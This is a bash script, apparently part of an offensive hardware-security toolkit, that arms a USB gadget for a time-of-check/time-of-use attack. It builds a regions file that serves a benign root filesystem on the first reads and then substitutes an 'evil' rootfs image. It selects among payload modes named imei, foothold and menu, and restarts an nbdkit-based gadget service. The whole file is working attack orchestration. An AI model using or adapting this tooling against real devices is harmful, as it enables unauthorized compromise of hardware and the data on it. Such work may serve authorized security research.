#!/bin/bash
# Arm the dynamic-USB gadget with a chosen payload envelope.
#
#   sudo ./arm.sh imei|foothold|menu|menu2
#
# Generates build/regions_<mode>.json from the baseline build/regions.json (the rootfs extent
# off/len emitted by 02_build_usb_image.sh) by substituting the chosen payload envelope, then
# tears down any live gadget and (re)deploys. Run 99_teardown.sh to unwind.
set -euo pipefail
HERE="$(cd "$(dirname "$0")" && pwd)"
BUILD="$HERE/build"

case "${1:-}" in
  imei)     EVIL="evil_rootfs.te2"          ; REG="$BUILD/regions.json" ;;
  foothold) EVIL="evil_rootfs_foothold.te2" ; REG="$BUILD/regions_foothold.json" ;;
  menu)     EVIL="evil_rootfs_menu.te2"     ; REG="$BUILD/regions_menu.json" ;;
  menu2)    EVIL="evil_rootfs_menu_v2.te2"  ; REG="$BUILD/regions_menu_v2.json" ;;
  *) echo "usage: arm.sh imei|foothold|menu|menu2"; exit 2 ;;
esac

BASE="$BUILD/regions.json"
[ -f "$BASE" ]          || { echo "missing $BASE — run 02_build_usb_image.sh first"; exit 1; }
[ -f "$BUILD/$EVIL" ]   || { echo "missing $BUILD/$EVIL — build it first (build_v2.sh / 01_make_evil_rootfs.sh)"; exit 1; }

# read the rootfs extent off/len from the baseline regions.json (no jq dependency)
read -r OFF LEN < <(python3 -c 'import json,sys; r=json.load(open(sys.argv[1]))[0]; print(r["off"], r["len"])' "$BASE")

cat > "$REG" <<JSON
[
  { "off": $OFF, "len": $LEN, "evil": "$BUILD/$EVIL", "switch_after_pass": 2, "mode": "benign_then_evil" }
]
JSON

systemctl stop toctou-gadget.service 2>/dev/null || true
"$HERE/99_teardown.sh" 2>/dev/null || true
pkill -f nbdkit_toctou 2>/dev/null || true
sleep 1

"$HERE/03_deploy_gadget.sh" "$BUILD/usb.img" "$REG"
echo "[arm] armed $1; regions=$(basename "$REG") evil=$EVIL off=$OFF len=$LEN"
